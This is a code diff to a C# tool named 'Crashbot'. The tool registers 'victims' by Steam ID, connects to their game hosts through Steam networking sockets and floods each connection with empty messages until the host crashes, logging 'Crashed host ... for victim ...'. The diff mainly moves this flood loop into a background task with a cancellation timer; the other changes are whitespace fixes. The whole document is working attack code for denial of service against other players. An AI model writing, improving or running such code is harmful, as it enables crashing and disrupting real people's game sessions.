@@ -37,8 +37,8 @@ namespace Crashbot
         private const int REQUEST_TIMEOUT = 1000;
         private readonly InterfaceMode OperationMode;
         private readonly SteamThread SteamThread;
-        private SteamInterface(InterfaceMode operation) 
-        { 
+        private SteamInterface(InterfaceMode operation)
+        {
             this.OperationMode = operation;
             this.SteamThread = new SteamThread(operation);
         }
@@ -67,7 +67,7 @@ namespace Crashbot
         /// <returns></returns>
         public bool AddNewVictim(Victim victim)
             => this.victims.TryAdd(victim.SteamId, victim);
-        
+
         /// <summary>
         /// 
         /// </summary>
@@ -182,25 +182,30 @@ namespace Crashbot
                 SteamNetConnectionInfo_t info = ix.Value;
                 HSteamNetConnection conn = cx.Value;
 
-                SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new IntPtr[1], 1);
+                CancellationTokenSource cancellationTokenSource = new();
+                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new IntPtr[1], 1), cancellationTokenSource.Token)
+                    .ContinueWith(_ =>
+                    {
+                        for (int i = 0; i < FUN_TIME; i++)
+                        {
+                            this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
+                            this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
+                            Task.Delay(20).Wait();
+                        }
 
-                for (int i = 0; i < FUN_TIME; i++)
-                {
-                    this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
-                    this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
-                    Task.Delay(20).Wait();
-                }
+                        Task.Delay(500).Wait();
 
-                Task.Delay(500).Wait();
+                        Console.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
 
-                Console.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
+                        SteamNetworkingSockets.CloseConnection(conn, 0, "Cancelled", false);
+                        SteamNetworkingSockets.ResetIdentity(ref remoteIdentity);
+                        SteamAPI.RunCallbacks();
 
-                SteamNetworkingSockets.CloseConnection(conn, 0, "Cancelled", false);
-                SteamNetworkingSockets.ResetIdentity(ref remoteIdentity);
-                SteamAPI.RunCallbacks();
+                        mega_victim.IsCrashing = false;
+                        mega_victim.OnRichPresenceUpdate([]);
+                    });
 
-                mega_victim.IsCrashing = false;
-                mega_victim.OnRichPresenceUpdate([]);
+                Task.Delay(1000).ContinueWith(_ => cancellationTokenSource.Cancel());
             }
         }
 
@@ -258,7 +263,7 @@ namespace Crashbot
 
         public void WaitUntilSteamReady()
         {
-            while(!this.SteamThread.SteamIsReady)
+            while (!this.SteamThread.SteamIsReady)
                 Task.Delay(1).Wait();
         }
     }
